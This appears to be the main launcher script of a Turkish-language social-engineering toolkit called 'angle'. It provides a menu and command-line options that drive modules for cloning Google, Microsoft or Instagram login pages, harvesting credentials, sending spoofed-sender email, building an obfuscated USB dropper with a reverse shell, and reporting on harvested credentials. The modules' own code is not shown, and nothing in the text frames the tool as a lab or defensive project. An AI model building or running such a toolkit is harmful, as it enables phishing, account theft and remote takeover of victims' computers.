#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
angle — modüler sosyal mühendislik araç seti.

kullanım:
    python angle.py                        # interaktif menü
    python angle.py oltalama --url URL     # oltalama modülü
    python angle.py toplayici --port 9090  # kimlik toplayıcı
    python angle.py eposta --gonderen ...  # e-posta gönderimi
    python angle.py usb --hedef ...        # USB damlalık
    python angle.py --version              # versiyon bilgisi
"""

from __future__ import annotations

import argparse
import sys
import traceback
from typing import Optional

from angle_modulleri.konsol import konsol, VERSIYON
from angle_modulleri.yardimci import yapilandirma_yukle
from angle_modulleri import (
    bagimliliklari_kontrol_et,
    modulleri_listele,
    oltalama,
    toplayici,
    eposta_sahte,
    usb_damlat,
)


# ────────────────────────────── interaktif menü ──────────────────────────────

def interaktif_menu() -> None:
    """kullanıcıya konsol tabanlı premium yönlendirmeli (wizard) menü sunar."""
    konsol.banner_goster()

    # bağımlılık kontrolü
    eksikler = bagimliliklari_kontrol_et()
    if eksikler:
        konsol.uyari("eksik bağımlılıklar tespit edildi:")
        for paket in eksikler:
            konsol.soluk(f"• {paket}")
        konsol.soluk(f"yüklemek için: pip install {' '.join(eksikler)}")
        konsol.ayirici()

    # modülleri keşfet
    moduller = modulleri_listele()

    while True:
        menu_haritalari: dict[str, dict] = {}
        sayac = 1

        try:
            tablo = konsol.tablo_olustur("ANGLE — Interaktif Ana Menü", ["Seçenek", "Modül Açıklaması", "Durum"])
            for mod_adi, bilgi in moduller.items():
                if bilgi.get("giris_noktasi"):
                    menu_haritalari[str(sayac)] = {
                        "modul": mod_adi,
                        "bilgi": bilgi,
                    }
                    durum = "[Eksik Bağımlılık]" if bilgi.get("hata") else "[Hazır]"
                    tablo.add_row(f"[{sayac}]", bilgi.get("aciklama", mod_adi), durum)
                    sayac += 1

            tablo.add_row("[0]", "Çıkış Yap", "[Çıkış]")
            konsol.tablo_yazdir(tablo)
        except Exception:
            for mod_adi, bilgi in moduller.items():
                if bilgi.get("giris_noktasi"):
                    menu_haritalari[str(sayac)] = {
                        "modul": mod_adi,
                        "bilgi": bilgi,
                    }
                    print(f"  [{sayac}] {bilgi.get('aciklama', mod_adi)}")
                    sayac += 1
            print("  [0] Çıkış")

        konsol.ayirici()

        secim = konsol.girdi_al("seçiminiz").strip()

        if secim == "0":
            konsol.bilgi("çıkış yapılıyor...")
            sys.exit(0)

        secilen = menu_haritalari.get(secim)
        if secilen is None:
            konsol.uyari("geçersiz seçim, tekrar deneyin.")
            continue

        bilgi = secilen["bilgi"]
        modul_adi = secilen["modul"]

        if bilgi.get("hata"):
            konsol.hata(f"modül yüklenemedi: {bilgi['hata']}")
            continue

        modul = bilgi.get("_modul")
        giris_fonksiyonu_adi = bilgi.get("giris_noktasi")

        if modul and giris_fonksiyonu_adi:
            giris_fonk = getattr(modul, giris_fonksiyonu_adi, None)
            if giris_fonk and callable(giris_fonk):
                try:
                    giris_fonk()
                except KeyboardInterrupt:
                    print()
                    konsol.bilgi("işlem iptal edildi.")
                except Exception as e:
                    konsol.hata(f"modül hatası: {e}")
                    konsol.soluk(traceback.format_exc())
            else:
                konsol.hata(f"giriş noktası bulunamadı: {giris_fonksiyonu_adi}")
        else:
            konsol.hata(f"modül yüklenemedi: {modul_adi}")


# ────────────────────────────── CLI argparse ──────────────────────────────

def cli_olustur() -> argparse.ArgumentParser:
    """argparse ile komut satırı arayüzünü yapılandırır.

    Returns:
        yapılandırılmış ArgumentParser nesnesi
    """
    cozucu = argparse.ArgumentParser(
        prog="angle",
        description="angle — modüler sosyal mühendislik araç seti",
        epilog="daha fazla bilgi için: https://github.com/angle",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    cozucu.add_argument(
        "--version", "-V",
        action="version",
        version=f"angle v{VERSIYON}",
    )
    cozucu.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="detaylı çıktı modu",
    )
    cozucu.add_argument(
        "--config", "-c",
        type=str,
        default=None,
        help="özel yapılandırma dosyası yolu",
    )

    alt_eylemler = cozucu.add_subparsers(dest="modul", help="kullanılacak modül")

    # ─── oltalama ───
    oltalama_eylem = alt_eylemler.add_parser(
        "oltalama",
        help="oltalama sayfası oluştur ve sun",
    )
    oltalama_eylem.add_argument("--url", help="kopyalanacak oturum açma sayfası URL'si")
    oltalama_eylem.add_argument("--port", type=int, default=8080, help="sunucu portu (varsayılan: 8080)")
    oltalama_eylem.add_argument("--sablon", choices=["genel", "google", "microsoft", "instagram"],
                                 help="kullanılacak dahili şablon")
    oltalama_eylem.add_argument("--https", action="store_true", help="HTTPS etkinleştir")
    oltalama_eylem.add_argument("--sertifika", help="SSL sertifika dosyası")
    oltalama_eylem.add_argument("--anahtar", help="SSL anahtar dosyası")
    oltalama_eylem.add_argument("--dis-url", help="dış dünyaya açık domain veya tünel URL adresi")

    # ─── toplayıcı ───
    toplayici_eylem = alt_eylemler.add_parser(
        "toplayici",
        help="kimlik bilgisi toplayıcı dinleyici başlat",
    )
    toplayici_eylem.add_argument("--port", type=int, default=8080, help="dinlenecek port (varsayılan: 8080)")

    # ─── e-posta ───
    eposta_eylem = alt_eylemler.add_parser(
        "eposta",
        help="sahte e-posta gönder",
    )
    eposta_eylem.add_argument("--gonderen", required=True, help="gönderen adresi (sahte)")
    eposta_eylem.add_argument("--alici", required=True, help="alıcı adresi (virgülle ayrılabilir)")
    eposta_eylem.add_argument("--konu", required=True, help="e-posta konusu")
    eposta_eylem.add_argument("--mesaj", required=True, help="mesaj metni")
    eposta_eylem.add_argument("--sunucu", required=True, help="SMTP sunucu adresi")
    eposta_eylem.add_argument("--port", type=int, default=587, help="SMTP portu (varsayılan: 587)")
    eposta_eylem.add_argument("--kullanici", required=True, help="SMTP kullanıcı adı")
    eposta_eylem.add_argument("--sifre", required=True, help="SMTP şifresi")
    eposta_eylem.add_argument("--ek", default=None, help="ek dosya yolu")
    eposta_eylem.add_argument("--html", action="store_true", help="mesajı HTML olarak gönder")
    eposta_eylem.add_argument("--ssl", action="store_true", help="doğrudan SSL bağlantısı kullan (port 465)")

    # ─── USB damlalık ───
    usb_eylem = alt_eylemler.add_parser(
        "usb",
        help="USB damlalık oluştur",
    )
    usb_eylem.add_argument("--hedef", required=True, help="USB belleğin bağlanacağı dizin")
    usb_eylem.add_argument("--ip", required=True, help="ters kabuk için dinleyici IP adresi")
    usb_eylem.add_argument("--port", required=True, type=int, help="ters kabuk portu")
    usb_eylem.add_argument("--os", choices=["windows", "linux", "macos"],
                            default="windows", help="hedef işletim sistemi")
    usb_eylem.add_argument("--no-obfuscate", action="store_true", help="payload gizlemeyi devre dışı bırak")

    # ─── rapor ───
    rapor_eylem = alt_eylemler.add_parser(
        "rapor",
        help="toplanan kimlik kayıtlarından rapor üret",
    )
    rapor_eylem.add_argument("--girdi", default="toplanan_kimlikler.txt", help="girdi log dosyası")
    rapor_eylem.add_argument("--cikti", default="rapor.json", help="üretilecek rapor dosyası yolu")
    rapor_eylem.add_argument("--format", choices=["json", "csv", "html"], default="json", help="rapor formatı")

    return cozucu


# ────────────────────────────── ana giriş noktası ──────────────────────────────

def ana() -> None:
    """angle ana giriş noktası — CLI veya interaktif menü."""

    # global exception handler
    def _istisna_yakalayici(tur, deger, geri_izleme):
        if tur is KeyboardInterrupt:
            print()
            konsol.bilgi("Ctrl+C — çıkış yapılıyor...")
            sys.exit(0)
        konsol.hata(f"beklenmedik hata: {deger}")
        konsol.soluk("".join(traceback.format_tb(geri_izleme)))

    sys.excepthook = _istisna_yakalayici

    cozucu = cli_olustur()
    argumanlar = cozucu.parse_args()

    # verbose mod
    if argumanlar.verbose:
        import logging
        konsol.loglama_kur(seviye=logging.DEBUG, detayli=True)

    # yapılandırma
    from pathlib import Path
    config_dosya = Path(argumanlar.config) if argumanlar.config else None
    yapilandirma = yapilandirma_yukle(dosya_yolu=config_dosya)

    if argumanlar.modul is None:
        # hiçbir alt komut verilmemişse interaktif menüye dön
        interaktif_menu()

    elif argumanlar.modul == "oltalama":
        oltalama.baslat(
            url=argumanlar.url,
            port=argumanlar.port,
            sablon=argumanlar.sablon,
            https=argumanlar.https,
            sertifika=argumanlar.sertifika,
            anahtar=argumanlar.anahtar,
            dis_url=argumanlar.dis_url,
        )

    elif argumanlar.modul == "toplayici":
        toplayici.baslat(port=argumanlar.port, interaktif=False)

    elif argumanlar.modul == "eposta":
        eposta_sahte.gonder(
            gonderen=argumanlar.gonderen,
            alici=argumanlar.alici,
            konu=argumanlar.konu,
            mesaj=argumanlar.mesaj,
            sunucu=argumanlar.sunucu,
            port=argumanlar.port,
            kullanici=argumanlar.kullanici,
            sifre=argumanlar.sifre,
            ek_dosya=argumanlar.ek,
            html=argumanlar.html,
            ssl=argumanlar.ssl,
        )

    elif argumanlar.modul == "usb":
        usb_damlat.olustur(
            hedef_dizin=argumanlar.hedef,
            dinleyici_ip=argumanlar.ip,
            dinleyici_port=argumanlar.port,
            hedef_os=getattr(argumanlar, "os", None),
            obfuscate=not argumanlar.no_obfuscate,
        )

    elif argumanlar.modul == "rapor":
        from angle_modulleri.yardimci import rapor_olustur
        rapor_olustur(
            log_dosyasi=argumanlar.girdi,
            cikti_dosyasi=argumanlar.cikti,
            format_turu=argumanlar.format,
        )


if __name__ == "__main__":
    ana()